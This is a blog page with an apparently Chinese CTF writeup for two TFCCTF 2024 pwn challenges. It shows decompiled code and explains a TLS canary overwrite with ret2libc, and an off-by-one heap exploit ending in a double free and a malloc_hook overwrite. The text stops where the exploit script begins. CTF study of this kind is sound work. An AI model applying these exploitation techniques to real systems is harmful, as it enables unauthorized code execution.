<!DOCTYPE html>
<html lang="en">
    <!-- title -->


    

<!-- keywords -->



<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <meta name="author" content="nyyyddddn">
    <meta name="renderer" content="webkit">
    <meta name="copyright" content="nyyyddddn">
    
        <meta name="keywords" content="hexo,hexo-theme,hexo-blog">
    
    <meta name="description" content="">
    <meta name="description" content="题目附件https:&#x2F;&#x2F;github.com&#x2F;nyyyddddn&#x2F;ctf&#x2F;tree&#x2F;main&#x2F;tfcctf2024 pwnGUARD-THE-BYPASS程序的逻辑如下 这里GUARD也就是指canary 1234567891011121314151617181920212223242526272829303132int __cdecl main(int argc, const char **ar">
<meta property="og:type" content="article">
<meta property="og:title" content="tfcctf2024">
<meta property="og:url" content="https://nyyyddddn.github.io/2024/08/08/tfcctf2024/index.html">
<meta property="og:site_name" content="nyyyddddn">
<meta property="og:description" content="题目附件https:&#x2F;&#x2F;github.com&#x2F;nyyyddddn&#x2F;ctf&#x2F;tree&#x2F;main&#x2F;tfcctf2024 pwnGUARD-THE-BYPASS程序的逻辑如下 这里GUARD也就是指canary 1234567891011121314151617181920212223242526272829303132int __cdecl main(int argc, const char **ar">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://nyyyddddn.github.io/G:/ctf/tfcctf/img/1722599774224.png">
<meta property="article:published_time" content="2024-08-07T16:39:15.000Z">
<meta property="article:modified_time" content="2024-09-05T13:56:15.923Z">
<meta property="article:author" content="nyyyddddn">
<meta property="article:tag" content="ctf writeup">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://nyyyddddn.github.io/G:/ctf/tfcctf/img/1722599774224.png">
    <meta http-equiv="Cache-control" content="no-cache">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <link rel="icon" href="/null">
    
    <title>tfcctf2024 · nyyyddddn&#39;s blog</title>
    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
/* This file is meant as a standalone workflow for
- testing support for link[rel=preload]
- enabling async CSS loading in browsers that do not support rel=preload
- applying rel preload css once loaded, whether supported or not.
*/ -->
<script>
    (function (w) {
        'use strict'
        // rel=preload support test
        if (!w.loadCSS) {
            w.loadCSS = function () {}
        }
        // define on the loadCSS obj
        var rp = (loadCSS.relpreload = {})
        // rel=preload feature support test
        // runs once and returns a function for compat purposes
        rp.support = (function () {
            var ret
            try {
                ret = w.document.createElement('link').relList.supports('preload')
            } catch (e) {
                ret = false
            }
            return function () {
                return ret
            }
        })()

        // if preload isn't supported, get an asynchronous load by using a non-matching media attribute
        // then change that media back to its intended value on load
        rp.bindMediaToggle = function (link) {
            // remember existing media attr for ultimate state, or default to 'all'
            var finalMedia = link.media || 'all'

            function enableStylesheet() {
                link.media = finalMedia
            }

            // bind load handlers to enable media
            if (link.addEventListener) {
                link.addEventListener('load', enableStylesheet)
            } else if (link.attachEvent) {
                link.attachEvent('onload', enableStylesheet)
            }

            // Set rel and non-applicable media type to start an async request
            // note: timeout allows this to happen async to let rendering continue in IE
            setTimeout(function () {
                link.rel = 'stylesheet'
                link.media = 'only x'
            })
            // also enable media after 3 seconds,
            // which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
            setTimeout(enableStylesheet, 3000)
        }

        // loop through link elements in DOM
        rp.poly = function () {
            // double check this to prevent external calls from running
            if (rp.support()) {
                return
            }
            var links = w.document.getElementsByTagName('link')
            for (var i = 0; i < links.length; i++) {
                var link = links[i]
                // qualify links to those with rel=preload and as=style attrs
                if (
                    link.rel === 'preload' &&
                    link.getAttribute('as') === 'style' &&
                    !link.getAttribute('data-loadcss')
                ) {
                    // prevent rerunning on link
                    link.setAttribute('data-loadcss', true)
                    // bind listeners to toggle media back
                    rp.bindMediaToggle(link)
                }
            }
        }

        // if unsupported, run the polyfill
        if (!rp.support()) {
            // run once at least
            rp.poly()

            // rerun poly on an interval until onload
            var run = w.setInterval(rp.poly, 500)
            if (w.addEventListener) {
                w.addEventListener('load', function () {
                    rp.poly()
                    w.clearInterval(run)
                })
            } else if (w.attachEvent) {
                w.attachEvent('onload', function () {
                    rp.poly()
                    w.clearInterval(run)
                })
            }
        }

        // commonjs
        if (typeof exports !== 'undefined') {
            exports.loadCSS = loadCSS
        } else {
            w.loadCSS = loadCSS
        }
    })(typeof global !== 'undefined' ? global : this)
</script>

    <style type="text/css">
    @font-face {
        font-family: 'Oswald-Regular';
        src: url("/font/Oswald-Regular.ttf");
    }

    body {
        margin: 0;
    }

    header,
    footer,
    .back-top,
    .sidebar,
    .container,
    .site-intro-meta,
    .toc-wrapper {
        display: none;
    }

    .site-intro {
        position: relative;
        z-index: 3;
        width: 100%;
        /* height: 50vh; */
        overflow: hidden;
    }

    .site-intro-placeholder {
        position: absolute;
        z-index: -2;
        top: 0;
        left: 0;
        width: calc(100% + 300px);
        height: 100%;
        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
        background-position: center center;
        transform: translate3d(-226px, 0, 0);
        animation: gradient-move 2.5s ease-out 0s infinite;
    }

    @keyframes gradient-move {
        0% {
            transform: translate3d(-226px, 0, 0);
        }
        100% {
            transform: translate3d(0, 0, 0);
        }
    }
</style>

    <link rel="preload" href="/css/style.css?v=20211217" as="style" onload="this.onload=null;this.rel='stylesheet'">
    <link rel="preload" href="/css/dark.css?v=20211217" as="style">
    <link rel="stylesheet" href="/css/dark.css">
    <link rel="stylesheet" href="/css/mobile.css?v=20211217" media="(max-width: 960px)">
    <link rel="preload" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" as="script">
    <link rel="preload" href="/scripts/main.js?v=20211217" as="script">
    <link rel="preload" href="/scripts/dark.js?v=20211217" as="script">
    <link rel="preload" href="/font/Oswald-Regular.ttf" as="font" crossorigin>
    <link rel="preload" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" as="font" crossorigin>
    <!-- algolia -->
    
    <!-- 百度统计  -->
    
    <!-- 谷歌统计  -->
    
<meta name="generator" content="Hexo 6.3.0"></head>

    <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js"></script>
    <script type="text/javascript">
        if (typeof window.$ == undefined) {
            console.warn('jquery load from jsdelivr failed, will load local script')
            document.write('<script src="/lib/jquery.min.js" />')
        }
    </script>
    
        <body class="post-body">
    
        <!-- header -->
        <header class="header header-mobile">
    <!-- top read progress line -->
    <div class="header-element">
        <div class="read-progress"></div>
    </div>
    <!-- sidebar menu button -->
    <div class="header-element">
        
            <div class="header-sidebar-menu">
        
            
                <div style="padding-left: 1px;">&#xe775;</div>
            
        </div>
    </div>
    <!-- header actions -->
    <div class="header-actions">
        <!-- theme mode switch button -->
        <span class="header-theme-btn header-element">
            <i class="fas fa-adjust"></i>
        </span>
        <!-- back to home page text -->
        <span class="home-link header-element">
            <a href=/>nyyyddddn</a>
        </span>
    </div>
    <!-- toggle banner for post layout -->
    
        
            <div class="banner">
        
            <div class="blog-title header-element">
                <a href="/">nyyyddddn</a>
            </div>
            <div class="post-title header-element">
                <a href="#" class="post-name">tfcctf2024</a>
            </div>
        </div>
    
</header>

        <!-- fixed footer -->
        <footer class="footer-fixed">
    <!-- back to top button -->
    <div class="footer-fixed-element">
        
            <div class="back-top back-top-hidden">
        
        
            <div>&#xe639;</div>
        
        </div>
    </div>
</footer>

        <!-- wrapper -->
        <div class="wrapper">
            <div class="site-intro" style="







    height:50vh;

">
    
    <!-- 主页  -->
    
        
    <!-- 404页  -->
    
    <div class="site-intro-placeholder"></div>
    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
    <div class="site-intro-meta">
        <!-- 标题  -->
        <h1 class="intro-title">
            <!-- 主页  -->
            
                tfcctf2024
            <!-- 404 -->
            
        </h1>
        <!-- 副标题 -->
        <p class="intro-subtitle">
            <!-- 主页副标题  -->
            
                
            <!-- 404 -->
            
        </p>
        <!-- 文章页 meta -->
        
            <div class="post-intros">
                <!-- 文章页标签  -->
                
                    <div class= post-intro-tags >
    
    
        <a class="post-tag" href="javascript:void(0);" data-tags="ctf writeup">ctf writeup</a>
    
</div>

                
                <!-- 文章字数统计 -->
                
                <div class="post-intro-meta">
                    <!-- 撰写日期 -->
                    <span class="iconfont-archer post-intro-calander">&#xe676;</span>
                    <span class="post-intro-time">2024/08/08</span>
                    <!-- busuanzi -->
                    
                        <span id="busuanzi_container_page_pv" class="busuanzi-pv">
                            <span class="iconfont-archer post-intro-busuanzi">&#xe602;</span>
                            <span id="busuanzi_value_page_pv"></span>
                        </span>
                    
                    <!-- 文章分享 -->
                    <span class="share-wrapper">
                        <span class="iconfont-archer share-icon">&#xe71d;</span>
                        <span class="share-text">Share</span>
                        <ul class="share-list">
                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
                                <div class="share-qrcode"></div>
                            </li>
                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
                        </ul>
                    </span>
                </div>
            </div>
        
    </div>
</div>

            <script>
  // get user agent
  function getBrowserVersions() {
    var u = window.navigator.userAgent
    return {
      userAgent: u,
      trident: u.indexOf('Trident') > -1, //IE内核
      presto: u.indexOf('Presto') > -1, //opera内核
      webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
      gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
      mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
      ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
      android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
      iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
      iPad: u.indexOf('iPad') > -1, //是否为iPad
      webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
      weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
      uc: u.indexOf('UCBrowser') > -1, //是否为android下的UC浏览器
    }
  }
  var browser = {
    versions: getBrowserVersions(),
  }
  console.log('userAgent: ' + browser.versions.userAgent)

  // callback
  function fontLoaded() {
    console.log('font loaded')
    if (document.getElementsByClassName('site-intro-meta')) {
      document
        .getElementsByClassName('intro-title')[0]
        .classList.add('intro-fade-in')
      document
        .getElementsByClassName('intro-subtitle')[0]
        .classList.add('intro-fade-in')
      var postIntros = document.getElementsByClassName('post-intros')[0]
      if (postIntros) {
        postIntros.classList.add('post-fade-in')
      }
    }
  }

  // UC不支持跨域，所以直接显示
  function asyncCb() {
    if (browser.versions.uc) {
      console.log('UCBrowser')
      fontLoaded()
    } else {
      WebFont.load({
        custom: {
          families: ['Oswald-Regular'],
        },
        loading: function () {
          // 所有字体开始加载
          // console.log('font loading');
        },
        active: function () {
          // 所有字体已渲染
          fontLoaded()
        },
        inactive: function () {
          // 字体预加载失败，无效字体或浏览器不支持加载
          console.log('inactive: timeout')
          fontLoaded()
        },
        timeout: 5000, // Set the timeout to two seconds
      })
    }
  }

  function asyncErr() {
    console.warn('script load from CDN failed, will load local script')
  }

  // load webfont-loader async, and add callback function
  function async(u, cb, err) {
    var d = document,
      t = 'script',
      o = d.createElement(t),
      s = d.getElementsByTagName(t)[0]
    o.src = u
    if (cb) {
      o.addEventListener(
        'load',
        function (e) {
          cb(null, e)
        },
        false
      )
    }
    if (err) {
      o.addEventListener(
        'error',
        function (e) {
          err(null, e)
        },
        false
      )
    }
    s.parentNode.insertBefore(o, s)
  }

  var asyncLoadWithFallBack = function (arr, success, reject) {
    var currReject = function () {
      reject()
      arr.shift()
      if (arr.length) async(arr[0], success, currReject)
    }

    async(arr[0], success, currReject)
  }

  asyncLoadWithFallBack(
    [
      'https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js',
      'https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js',
      "/lib/webfontloader.min.js",
    ],
    asyncCb,
    asyncErr
  )
</script>

            <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
            <div class="container container-unloaded">
                <main class="main post-page">
    <article class="article-entry">
        <p>题目附件<a target="_blank" rel="noopener" href="https://github.com/nyyyddddn/ctf/tree/main/tfcctf2024">https://github.com/nyyyddddn/ctf/tree/main/tfcctf2024</a></p>
<h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="GUARD-THE-BYPASS"><a href="#GUARD-THE-BYPASS" class="headerlink" title="GUARD-THE-BYPASS"></a>GUARD-THE-BYPASS</h2><p>程序的逻辑如下 这里GUARD也就是指canary</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">int</span> __cdecl main(<span class="built_in">int</span> argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">int</span> v5; // [rsp+Ch] [rbp-14h] BYREF</span><br><span class="line">  pthread_t newthread; // [rsp+10h] [rbp-10h] BYREF</span><br><span class="line">  unsigned __int64 v7; // [rsp+18h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v7 = __readfsqword(0x28u);</span><br><span class="line">  setup(argc, argv, envp);</span><br><span class="line">  puts(<span class="string">&quot;Welcome! Press 1 to start the chall.&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v5);</span><br><span class="line">  <span class="keyword">if</span> ( v5 != <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(<span class="string">&quot;Bye!&quot;</span>);</span><br><span class="line">    exit(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">len</span> = get_len();</span><br><span class="line">  pthread_create(&amp;newthread, 0LL, game, 0LL);</span><br><span class="line">  pthread_join(newthread, 0LL);</span><br><span class="line">  <span class="keyword">return</span> v7 - __readfsqword(0x28u);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">unsigned __int64 __fastcall game(void *a1)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 buf[<span class="number">5</span>]; // [rsp+0h] [rbp-30h] BYREF</span><br><span class="line">  unsigned __int64 v3; // [rsp+28h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(0x28u);</span><br><span class="line">  memset(buf, <span class="number">0</span>, <span class="number">32</span>);</span><br><span class="line">  getchar();</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="built_in">len</span>);</span><br><span class="line">  <span class="keyword">return</span> v3 - __readfsqword(0x28u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>有canary 没有pie，修改寄存器的gadget也有</p>
<p>posix接口创建的线程 tls结构体离函数栈帧很近，可以覆盖tls中的canary去绕过canary然后打ret2libc，tls附近有一两个指针在程序执行的时候会往里面写数据，想到了一种很简单的方法，把game函数的canary和tls中的canary覆盖成指向bss的指针，直接一路写过去，就不需要管指针解引用段错误的问题了</p>
<h2 id="vspm"><a href="#vspm" class="headerlink" title="vspm"></a>vspm</h2><p>程序的逻辑</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br></pre></td><td class="code"><pre><span class="line">void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">int</span> v3; // [rsp+4h] [rbp-Ch] BYREF</span><br><span class="line">  unsigned __int64 v4; // [rsp+8h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(0x28u);</span><br><span class="line">  sub_1289(a1, a2, a3);</span><br><span class="line">  puts(<span class="string">&quot;Welcome to the Very Secure Password Manager!&quot;</span>);</span><br><span class="line">  puts(<span class="string">&quot;--------------------------------------------\n&quot;</span>);</span><br><span class="line">  puts(<span class="string">&quot;1. Save new password&quot;</span>);</span><br><span class="line">  puts(<span class="string">&quot;2. Check my passwords&quot;</span>);</span><br><span class="line">  puts(<span class="string">&quot;3. Delete credentials&quot;</span>);</span><br><span class="line">  puts(<span class="string">&quot;4. Exit&quot;</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = <span class="number">0</span>;</span><br><span class="line">    printf(<span class="string">&quot;Input: &quot;</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v3);</span><br><span class="line">    getchar();</span><br><span class="line">    <span class="keyword">if</span> ( v3 &lt;= <span class="number">0</span> || v3 &gt; <span class="number">4</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    switch ( v3 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        exit_();</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        delete_password();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        save_password();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      default:</span><br><span class="line">        show_password();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  puts(<span class="string">&quot;Not a valid choice :(&quot;</span>);</span><br><span class="line">  exit(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">unsigned __int64 save_password()</span><br><span class="line">&#123;</span><br><span class="line">  unsigned <span class="built_in">int</span> v1; // [rsp+8h] [rbp-68h] BYREF</span><br><span class="line">  <span class="built_in">int</span> i; // [rsp+Ch] [rbp-64h]</span><br><span class="line">  __int64 v3; // [rsp+10h] [rbp-60h]</span><br><span class="line">  __int64 v4; // [rsp+18h] [rbp-58h]</span><br><span class="line">  __int64 v5; // [rsp+20h] [rbp-50h]</span><br><span class="line">  __int64 v6; // [rsp+28h] [rbp-48h]</span><br><span class="line">  __int64 v7; // [rsp+30h] [rbp-40h]</span><br><span class="line">  __int64 v8; // [rsp+38h] [rbp-38h]</span><br><span class="line">  __int64 v9; // [rsp+40h] [rbp-30h]</span><br><span class="line">  __int64 v10; // [rsp+48h] [rbp-28h]</span><br><span class="line">  __int64 v11; // [rsp+50h] [rbp-20h]</span><br><span class="line">  __int64 v12; // [rsp+58h] [rbp-18h]</span><br><span class="line">  unsigned __int64 v13; // [rsp+68h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v13 = __readfsqword(0x28u);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">9</span> &amp;&amp; *((_QWORD *)&amp;unk_4060 + <span class="number">5</span> * i); ++i )</span><br><span class="line">    ;</span><br><span class="line">  <span class="keyword">if</span> ( i == <span class="number">10</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(<span class="string">&quot;No more space to save passwords.&quot;</span>);</span><br><span class="line">    exit(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  printf(<span class="string">&quot;\nSelect length: &quot;</span>);</span><br><span class="line">  v1 = <span class="number">0</span>;</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v1);</span><br><span class="line">  getchar();</span><br><span class="line">  <span class="keyword">if</span> ( v1 &gt;= <span class="number">0x79</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(<span class="string">&quot;Sorry, not enough resources!&quot;</span>);</span><br><span class="line">    exit(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  v3 = 0LL;</span><br><span class="line">  v4 = 0LL;</span><br><span class="line">  v5 = 0LL;</span><br><span class="line">  v6 = 0LL;</span><br><span class="line">  v7 = 0LL;</span><br><span class="line">  v8 = 0LL;</span><br><span class="line">  v9 = 0LL;</span><br><span class="line">  v10 = 0LL;</span><br><span class="line">  v11 = 0LL;</span><br><span class="line">  v12 = 0LL;</span><br><span class="line">  *((_QWORD *)&amp;unk_4060 + <span class="number">5</span> * i) = malloc((<span class="built_in">int</span>)v1);</span><br><span class="line">  printf(<span class="string">&quot;Enter credentials: &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, *((void **)&amp;unk_4060 + <span class="number">5</span> * i), (<span class="built_in">int</span>)(v1 + <span class="number">1</span>));</span><br><span class="line">  printf(<span class="string">&quot;Name of the credentials: &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, (char *)&amp;unk_4060 + <span class="number">40</span> * i + <span class="number">8</span>, (<span class="built_in">int</span>)(v1 + <span class="number">1</span>));</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(0x28u) ^ v13;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">int</span> show_password()</span><br><span class="line">&#123;</span><br><span class="line">  __int64 v0; // rax</span><br><span class="line">  <span class="built_in">int</span> i; // [rsp+Ch] [rbp-4h]</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">9</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v0 = *((_QWORD *)&amp;unk_4060 + <span class="number">5</span> * i);</span><br><span class="line">    <span class="keyword">if</span> ( v0 )</span><br><span class="line">      LODWORD(v0) = printf(</span><br><span class="line">                      <span class="string">&quot;%d. %.*s --&gt; %s&quot;</span>,</span><br><span class="line">                      (unsigned <span class="built_in">int</span>)i,</span><br><span class="line">                      <span class="number">32</span>,</span><br><span class="line">                      (const char *)&amp;unk_4060 + <span class="number">40</span> * i + <span class="number">8</span>,</span><br><span class="line">                      *((const char **)&amp;unk_4060 + <span class="number">5</span> * i));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">unsigned __int64 delete_password()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">int</span> v1; // [rsp+4h] [rbp-Ch] BYREF</span><br><span class="line">  unsigned __int64 v2; // [rsp+8h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(0x28u);</span><br><span class="line">  v1 = <span class="number">0</span>;</span><br><span class="line">  printf(<span class="string">&quot;Select index: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v1);</span><br><span class="line">  getchar();</span><br><span class="line">  <span class="keyword">if</span> ( !*((_QWORD *)&amp;unk_4060 + <span class="number">5</span> * v1) )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(<span class="string">&quot;You can&#x27;t delete a non-existent password.&quot;</span>);</span><br><span class="line">    exit(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  free(*((void **)&amp;unk_4060 + <span class="number">5</span> * v1));</span><br><span class="line">  *((_QWORD *)&amp;unk_4060 + <span class="number">5</span> * v1) = 0LL;</span><br><span class="line">  memset((char *)&amp;unk_4060 + <span class="number">40</span> * v1 + <span class="number">8</span>, <span class="number">0</span>, 0x20uLL);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(0x28u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>关闭了tcahce的glibc 2.30，漏洞是在create password的时候有一个off by one 可以覆盖相邻地址堆块的 chunk size一个字节，通过 off by one绕过size的限制申请出unsortedbin，然后切分unsortedbin利用残留的bk指针泄露libc基地址，只需要控制一下 off by one的size就可以在切分unsortedbin后和下一个堆块完全重叠，造成heap overlap，之后doube free写malloc hook 为one gadget触发就好了</p>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span 